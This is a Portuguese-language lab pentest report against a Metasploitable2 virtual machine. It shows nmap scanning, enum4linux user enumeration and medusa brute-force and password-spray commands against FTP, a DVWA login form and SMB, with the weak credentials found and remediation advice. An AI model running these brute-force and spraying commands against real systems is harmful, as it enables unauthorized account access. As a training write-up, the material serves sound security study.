# Documentação — Exploração e Enumeração (FTP / SMB / HTTP)

> **Aviso:** Este repositório contém resultados de testes de segurança. **Somente** realize testes similares contra sistemas que você tem autorização explícita para testar. Uso indevido das técnicas aqui descritas pode ser ilegal.

---

## Sumário

* [Resumo Executivo](#resumo-executivo)
* [Resumo das Descobertas](#resumo-das-descobertas)
* [Metodologia (alto nível)](#metodologia-alto-nivel)
* [Comandos e Saídas Relevantes (anexo)](#comandos-e-saidas-relevantes-anexo)
* [Evidências e Anexos](#evidencias-e-anexos)
* [Risco e Recomendações](#risco-e-recomendacoes)
* [Ferramentas Utilizadas](#ferramentas-utilizadas)
* [Como Reproduzir (apenas em ambiente autorizado)](#como-reproduzir-apenas-em-ambiente-autorizado)
* [Licença e Contato](#licenca-e-contato)

---

## Resumo Executivo

Este documento descreve a exploração e enumeração realizadas contra o alvo **192.168.56.101** (ambiente controlado). Foram identificados serviços FTP (`vsftpd 2.3.4`), SSH (`OpenSSH`), HTTP (`Apache httpd`), e SMB/Samba. Foram registrados acessos por força bruta bem-sucedida em serviços FTP/HTTP e vários usuários identificados via enumeração SMB.

Resumo rápido:

* Host ativo e respondendo a ICMP.
* FTP (porta 21) com `vsftpd 2.3.4`.
* SSH (porta 22) com `OpenSSH`.
* HTTP (porta 80) rodando `Apache httpd`.
* SMB (139/445) com Samba.
* Credenciais fracas encontradas por força bruta (ex.: `msfadmin:msfadmin`, `msfadmin:123456`, `admin:admin`, etc.).

---

## Escopo e Autorização

**Alvo e ambiente de teste:** Este trabalho foi realizado em um **ambiente de estudo/controlado**: a máquina atacante foi um **Kali Linux** e a máquina alvo foi o **Metasploitable2** (IP: `192.168.56.101`). Todas as atividades descritas ocorreram dentro desse laboratório e com autorização explícita do responsável pelo ambiente.

**Período do teste:** inserir datas (ex.: 2025-11-01 a 2025-11-02)

---

## Resumo das Descobertas

1. **FTP (21/tcp)** — Serviço `vsftpd 2.3.4`. Conta descoberta: `msfadmin:msfadmin` (força bruta). Risco: **alto** se combina com upload remoto habilitado.
2. **HTTP (80/tcp)** — `Apache httpd 2.2.8`. Formulários web suscetíveis a credenciais fracas — múltiplas credenciais encontradas por força bruta (ver anexo).
3. **SMB (139/445)** — Samba detectado; enumeração mostrou vários usuários do sistema (`user`, `msfadmin`, `root`, `www-data`, etc.). Força bruta/spray não produziu credenciais novas no trecho mostrado, mas a enumeração confirmou contas disponíveis.

> Observação: a classificação de risco e as recomendações detalhadas estão em **Risco e Recomendações**.

---

## Metodologia (alto nível)

1. **Descoberta:** ping/ICMP para verificar presença do host.
2. **Varredura de portas e identificação de serviços:** Nmap com detecção de versão.
3. **Enumeração:** execução de `enum4linux` para coletar contas SMB e informações de rede.
4. **Ataques controlados (força bruta):** uso de `medusa` para testar credenciais em FTP, HTTP (form), e SMB usando wordlists (usuários e senhas).
5. **Registro de evidências:** salvar saídas em arquivos (ex.: `enum4-output.txt`).


---

## Comandos e Saídas Relevantes (anexo)

> Abaixo estão os trechos de comandos e saídas coletadas durante os testes. Estes são mantidos como evidência bruta.

### Verificação de conectividade (ping)

```
ping -c 3 192.168.56.101
```

Saída:

```
PING 192.168.56.101 (192.168.56.101) 56(84) bytes of data.
64 bytes from 192.168.56.101: icmp_seq=1 ttl=64 time=0.691 ms
64 bytes from 192.168.56.101: icmp_seq=2 ttl=64 time=0.812 ms
64 bytes from 192.168.56.101: icmp_seq=3 ttl=64 time=0.854 ms

--- 192.168.56.101 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2013ms
rtt min/avg/max/mdev = 0.691/0.785/0.854/0.069 ms
```

### Varredura de portas (nmap)

```
nmap -sV -p 21,22,80,445,139 192.168.56.101
```

Saída (resumida):

```
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1
80/tcp  open  http        Apache httpd 2.2.8
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X
```

### Força bruta em FTP (medusa)

```
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 4
```

Trecho da saída (contendo credenciais encontradas):

```
ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
```

### Ataque de força bruta em formulários web (medusa — tentativa)

```
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM: 'username =^USER^&password=^PASS^&Login' \
-m 'FAIL=login failed' -t6
```

Saída (trechos):

```
WARNING: Invalid method: PAGE.
... (warnings)
ACCOUNT FOUND: [http] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
ACCOUNT FOUND: [http] Host: 192.168.56.101 User: msfadmin Password: 123456 [SUCCESS]
... (várias credenciais encontradas)
```

### Enumeração SMB (enum4linux)

```
enum4linux -a 192.168.56.101 | tee enum4-output.txt
```

Saída (trecho — usuários encontrados):

```
Account: games
Account: nobody
Account: bind
Account: proxy
Account: syslog
Account: user
Account: www-data
Account: root
Account: msfadmin
... (mais contas)
```

### Preparação de listas para ataque (exemplos)

```
echo -e "user\nmsfadmin\nservice" > smb-users.txt

echo -e "n123456\nWelcome123\nmsfadmin\password" > senhas-spray.txt
```

### Brute force SMB com medusa (exemplo)

```
medusa -h 192.168.56.101 -U smb-users.txt -P senhas-spray.txt -M smbnt -t2 -T 50
```

Saída (trecho):

```
ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin
... (checagens concluídas)
```

---



## Risco e Recomendações

**Riscos principais identificados:**

* Utilização de credenciais fracas por serviços expostos.
* Versões de serviços desatualizadas (ex.: `vsftpd 2.3.4`, `Apache 2.2.8`) — podem conter vulnerabilidades conhecidas.

**Recomendações imediatas:**

1. Alterar senhas fracas encontradas e aplicar políticas de senhas fortes (complexidade e rotação).
2. Proibir autenticação por senha para contas privilegiadas; usar chaves públicas/privadas onde possível (SSH).
3. Atualizar serviços para versões suportadas e aplicar patches de segurança.
4. Restringir acesso a serviços críticos via firewall (apenas IPs confiáveis ou VPN).
5. Desabilitar serviços desnecessários (ex.: FTP se não for estritamente necessário) ou limitar uploads.
6. Monitoramento (IDS/IPS) e logs centralizados para detectar tentativas de força bruta.

---

## Ferramentas Utilizadas

* `nmap` — detecção de portas e versões
* `medusa` — força bruta / autenticação
* `enum4linux` — enumeração SMB
* `ping` — verificação de conectividade

---

## Como Reproduzir (apenas em ambiente autorizado)

> **IMPORTANTE:** Somente reproduza estes passos em ambientes de teste ou quando tiver autorização explícita.

* Realize varredura com `nmap` para mapear serviços.
* Enumere SMB com `enum4linux` para listar contas e recursos.
* Teste autenticação com ferramentas de brute force apenas usando wordlists pequenas e controladas, e limitando a taxa (para não causar DoS).

---
